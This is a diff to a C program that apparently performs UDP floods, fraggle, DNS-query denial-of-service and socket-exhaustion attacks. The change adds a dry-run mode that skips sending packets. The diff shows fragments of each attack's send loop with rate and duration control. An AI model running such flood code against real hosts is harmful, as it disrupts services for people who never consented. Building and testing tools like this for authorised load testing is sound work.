@@ -40,7 +40,8 @@ static int create_udp_socket() {
 }
 
 static void print_attack_start(char *type_name, struct attack_opts_t *opts) {
-	 LOG_INFO("Started %s attack to %s for %d seconds %s", 
+	 LOG_INFO("%s Started %s attack to %s for %d seconds %s",
+		 opt_dryrun ? "(Dry-run)" : "", 
                  type_name, opts->atk_target, opts->atk_duration, 
                  opt_verbose ? "(detailed packet info will be shown)" : "");
 
@@ -79,7 +80,10 @@ void perform_udp_flood(struct attack_opts_t *opts) {
         time_t start = time(NULL);
 
         while (should_continue(start, opts->atk_duration)) {
-                sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
+                if(!opt_dryrun)
+			sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
+		else
+			usleep(10000);
 		pk_counter++;
                 if (opts->atk_rate > 0)
                         usleep(1000000 / opts->atk_rate);
@@ -113,7 +117,11 @@ void perform_udp_fraggle(struct attack_opts_t *opts) {
         time_t start = time(NULL);
 
         while (should_continue(start, opts->atk_duration)) {
-                sendto(sockfd, message, sizeof(message), 0, (struct sockaddr *)&target, sizeof(target));
+                if(!opt_dryrun)
+			sendto(sockfd, message, sizeof(message), 0, (struct sockaddr *)&target, sizeof(target));
+		else
+			usleep(10000);
+
                 if (opts->atk_rate > 0)
                         usleep(1000000 / opts->atk_rate);
         }
@@ -143,7 +151,11 @@ void perform_udp_app_layer_dos(struct attack_opts_t *opts) {
         time_t start = time(NULL);
 
         while (should_continue(start, opts->atk_duration)) {
-                sendto(sockfd, dns_query, sizeof(dns_query), 0, (struct sockaddr *)&target, sizeof(target));
+                if(!opt_dryrun)
+			sendto(sockfd, dns_query, sizeof(dns_query), 0, (struct sockaddr *)&target, sizeof(target));
+		else
+			usleep(10000);
+
                 if (opts->atk_rate > 0)
                         usleep(1000000 / opts->atk_rate);
         }
@@ -175,7 +187,11 @@ void perform_udp_socket_exhaustion(struct attack_opts_t *opts) {
         	buffer[0] = checksum >> 8;
         	buffer[1] = checksum & 0xFF;
                 
-		sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
+		if(!opt_dryrun)
+			sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
+		else
+			usleep(10000);
+
                 close(sockfd);
 
                 if (opts->atk_rate > 0)
